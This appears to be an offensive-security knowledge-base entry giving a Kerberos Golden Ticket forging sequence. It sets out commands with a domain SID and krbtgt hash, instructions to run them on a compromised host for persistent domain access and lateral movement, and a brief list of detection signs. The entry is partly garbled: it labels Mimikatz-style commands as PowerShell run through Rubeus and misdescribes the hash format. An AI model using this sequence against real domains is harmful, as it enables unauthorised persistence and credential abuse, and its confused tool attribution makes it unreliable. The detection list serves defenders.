---
id: e073c1d3-1a93-455d-87f3-d50a03993c78
name: Kerberos-Golden-Ticket-Forging-Sequence
type: code
language: ps1
verified: true
created_at: '2023-04-06T03:56:28.444566+00:00'
updated_at: '2023-04-10T20:37:25.782704+00:00'
platforms:
  - Windows
tags:
  - kerberos
  - golden-ticket
  - sequence
validated: true
---

# Kerberos-Golden-Ticket-Forging-Sequence

## Code

```ps1
kerberos::purge
kerberos::golden /user:evil /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /krbtgt:d125e4f69c851529045ec95ca80fa37e /ticket:evil.tck /ptt
kerberos::tgt
```

## Description

This PowerShell code sequence purges existing Kerberos tickets, forges and injects a Golden Ticket using the specified parameters, and then requests a TGT to validate the injection. It is used in post-exploitation scenarios to establish persistent domain access via Kerberos ticket forgery.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| /user:evil | Forged username | Administrator |
| /domain:pentestlab.local | Target domain | example.com |
| /sid:S-1-5-21-3737340914-2019594255-2413685307 | Domain SID | S-1-5-21-... (query via whoami /user) |
| /krbtgt:d125e4f69c851529045ec95ca80fa37e | krbtgt NTLM hash | aad3b435b51404eeaad3b435b51404ee:... (32-byte hash) |
| /ticket:evil.tck | Output ticket file | golden.tgt |
| /ptt | Flag to inject into session | N/A |

## Usage

Execute this sequence in a PowerShell session on a compromised domain-joined Windows machine after obtaining the krbtgt hash (e.g., via DCSync). It assumes Rubeus is loaded or executed in memory. After running, use the injected ticket for tools like PsExec or WMI for lateral movement.

## Detection

- Kerberos logs showing ticket purges or unusually long-lived TGTs (Event ID 4768/4769).
- PowerShell execution of Rubeus (Module logging, AMSI scans).
- Anomalous authentications from krbtgt to multiple services.
- Network traffic to KDC with forged ticket signatures.

## Related

- [[procedures/Golden-Ticket-Creation-via-Kerberos-Purge]]
- [[tools/Rubeus]]
